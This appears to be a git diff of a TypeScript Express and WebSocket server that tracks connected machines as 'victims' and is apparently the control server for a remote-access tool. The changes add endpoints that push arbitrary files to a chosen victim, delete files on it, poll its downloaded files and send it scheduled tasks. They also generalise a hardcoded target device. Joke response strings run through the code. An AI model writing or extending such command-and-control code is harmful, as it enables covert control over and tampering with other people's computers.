@@ -51,8 +51,11 @@ wss.on("connection", (ws, message) => {
         victims.set(deviceName, {
             "ws": ws,
             "debugLines": [],
-            "devName": deviceName
+            "devName": deviceName,
+            "fileNames": []
         });  
+
+        sendDownloadQueryToVictim(victims.get(deviceName) as Victim);
 
         console.log(`New device connected! ${deviceName}`)
     } else{
@@ -68,6 +71,9 @@ wss.on("connection", (ws, message) => {
             victim.debugLines.push(jsonData.content);
             console.log(`${victim.devName} just printed: \n${jsonData.content}`)
         }
+        if(jsonData.messageType == "DOWNLOADED_FILES"){
+            victim.fileNames = jsonData.content;
+        }
     })
 
     ws.on("close", (code, reason)=> {
@@ -76,13 +82,16 @@ wss.on("connection", (ws, message) => {
     })
 });
 
+function sendDownloadQueryToVictim(victim: Victim){
+    victim.ws.send(JSON.stringify({
+        "messageType": "QUERYDOWNLOADS",
+        "content": "kill"
+    }))
+}
 
 setInterval(()=> {
     for(let victim of victims.values()){
-        victim.ws.send(JSON.stringify({
-            "messageType": "QUERYDOWNLOADS",
-            "content": "kill"
-        }))
+        sendDownloadQueryToVictim(victim);
     }
 }, 20 * 1000)
 
@@ -91,10 +100,10 @@ app.use(cors())
 app.get("/devices", (req, res) => {
     var responseObj: Response = {}
     responseObj["message"] = "Device list";
-    responseObj["data"] = new Array<string>();
+    responseObj["data"] = new Array<Victim>();
     var keys = victims.forEach((value, key, map) => {
         var devList: Array<string> = responseObj["data"];
-        devList.push(key);
+        devList.push(JSON.stringify(value));
     })
     res.send(JSON.stringify(responseObj));
 });
@@ -122,10 +131,7 @@ app.get("/device", (req, res) => {
         responseObj["message"] = "Device Found";
 
         var data: Response = {};
-        data["deviceName"] = req.headers["device-id"];
-        data["online"] = "true";
-        
-        responseObj["data"] = data;
+        responseObj["data"] = victims.get(req.headers["device-id"]);
 
         res.status(200);
         res.send(JSON.stringify(responseObj));
@@ -318,13 +324,21 @@ app.post("/uploadFile", (req, res) => {
     if(!checkIfValueInJson(req.body, "fileContents", res)){
         return;
     }
+    if(!checkIfValueInJson(req.body, "deviceName", res)){
+        return;
+    }
 
-    if(victims.has("Ishaan_PC")){
-        victims.get("Ishaan_PC")?.ws.send(JSON.stringify({
+    if(victims.has(req.body["deviceName"])){
+        victims.get(req.body["deviceName"])?.ws.send(JSON.stringify({
             "messageType": "DOWNLOAD",
             "content": req.body["fileContents"],
             "fileName": req.body["fileName"]
         }));
+
+        setTimeout(() => {
+            sendDownloadQueryToVictim(victims.get(req.body["deviceName"]) as Victim)
+        }, 1000)
+        
     }
     res.send({"give nutrient": "no buy my nutrient for $10.99"});
 });
@@ -340,6 +354,29 @@ app.post("/sendJSON", (req,res)=> {
 
     if(victims.has(req.body["deviceName"])){
         victims.get(req.body["deviceName"])?.ws.send(JSON.stringify(req.body["jsonContent"]));
+    }
+
+    res.send({"the last thing i ever said to my grandpa": "was you are a coward"})
+})
+
+app.post("/deleteFile", (req,res)=> {
+    if(!checkIfValueInJson(req.body, "deviceName", res)){
+        return;
+    }
+
+    if(!checkIfValueInJson(req.body, "fileName", res)){
+        return;
+    }
+
+    if(victims.has(req.body["deviceName"])){
+        victims.get(req.body["deviceName"])?.ws.send(JSON.stringify({
+            "messageType": "DELETE",
+            "content": req.body["fileName"]
+        }));
+
+        setTimeout(() => {
+            sendDownloadQueryToVictim(victims.get(req.body["deviceName"]) as Victim)
+        }, 1000)
     }
 
     res.send({"the last thing i ever said to my grandpa": "was you are a coward"})
@@ -403,7 +440,7 @@ function executeScheduledTask(scheduledTask: ScheduledTask){
         var content: string = task.content;
         //TODO: variables
         for(let variable in scheduledTask.variables){
-            content = content.replace(scheduledTask.variables[variable].name, scheduledTask.variables[variable].value);
+            content = content.replaceAll(scheduledTask.variables[variable].name, scheduledTask.variables[variable].value);
         }
 
         victims.get(deviceID)?.ws.send(JSON.stringify({
